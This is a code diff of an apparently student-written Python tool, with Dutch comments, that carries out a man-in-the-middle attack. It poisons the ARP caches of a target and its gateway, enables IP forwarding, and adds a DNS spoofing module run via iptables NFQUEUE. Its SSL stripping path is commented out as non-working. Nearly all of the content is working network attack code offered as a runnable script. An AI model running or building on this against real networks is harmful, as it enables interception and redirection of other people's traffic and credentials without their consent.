@@ -6,6 +6,8 @@ import time
 import argparse
 
 #https://askubuntu.com/questions/1304100/ip-forwarding-does-not-work
+
+################# MITM #################
 def disable_ip_routing():
     # Disable IP routing
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
@@ -57,7 +59,6 @@ def restore_arp(target_ip, target_mac, gateway_adress, gateway_mac):
     send(ARP(op=2, pdst=gateway_adress, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
     send(ARP(op=2, pdst=target_ip, psrc=gateway_adress, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
 
-
 ################# SSL STRIP #################
 
 # Op dit moment werkt sslstrip niet. De code is wel al geschreven, maar de sslstrip tool werkt niet correct.
@@ -75,40 +76,45 @@ def install_ssl_strip():
     if not os.path.exists("./sslstrip"):
         os.system("bash resources/install_sslstrip.sh")
 
-
-def mitm(target_address, sslstrip_enabled):
+################# EXECUTE #################
+def mitm(target_address, sslstrip_enabled, dns_spoof_enabled):
     # Voer de MITM-aanval uit
+    running_side_processes=[]
     enable_ip_routing()
     gateway_adress, gateway_mac=get_default_gateway()
     try: # Op dit moment zal Flask nooit sslsltrip activeren aangezien de tool niet werkt.
-        if sslstrip_enabled:
-            install_ssl_strip()
-            activate_ssl_stripping()
+        # if sslstrip_enabled:
+        #     install_ssl_strip()
+        #     activate_ssl_stripping()
+        if dns_spoof_enabled:
+            subprocess.Popen([f'xterm -fs 14 -fa DejaVuSansMono -e "source .venv/bin/activate && echo dns spoof terminal && sudo python3 modules/mitm/dns_spoof_module.py"'],shell=True)
         while True:
             trick_targets(target_address, get_mac(target_address), gateway_adress, gateway_mac)
     except KeyboardInterrupt:
         print("Stopping MITM attack")
-    if sslstrip_enabled:
-        deactivate_ssl_stripping()
+    # if sslstrip_enabled:
+    #     deactivate_ssl_stripping()
+    for process in running_side_processes:
+        process.kill()
+
+    if dns_spoof_enabled:
+        subprocess.run(f"sudo iptables -D FORWARD -j NFQUEUE --queue-num 0", shell=True)
+
     restore_arp(target_address, get_mac(target_address), gateway_adress, gateway_mac)
     disable_ip_routing()
 
 def main():
-    # Creëer een parser voor de command-line argumenten
     parser = argparse.ArgumentParser(description="Script for performing a man-in-the-middle (MITM) attack with SSL stripping.")
 
-    # Voeg de argumenten toe
     parser.add_argument("target_ip", help="IP address of the target")
-    parser.add_argument("--sslstrip", action="store_true", help="Enable SSL stripping")
-
-    # Parsen van de argumenten
+    parser.add_argument("--sslstrip", action="store_true", help="Enable SSL stripping") # Tool doesn't work for now
+    parser.add_argument("--dnsspoof", action="store_true", help="Enable DNS spoofing") # Enebale dns spoofing
     args = parser.parse_args()
-
-    # Nu kun je de waarden van de argumenten gebruiken
     target_ip = args.target_ip
     sslstrip_enabled = args.sslstrip
+    dns_spoof_enabled = args.dnsspoof
 
-    mitm(target_ip, sslstrip_enabled)
+    mitm(target_ip, sslstrip_enabled, dns_spoof_enabled)
 
 if __name__ == "__main__":
     main()
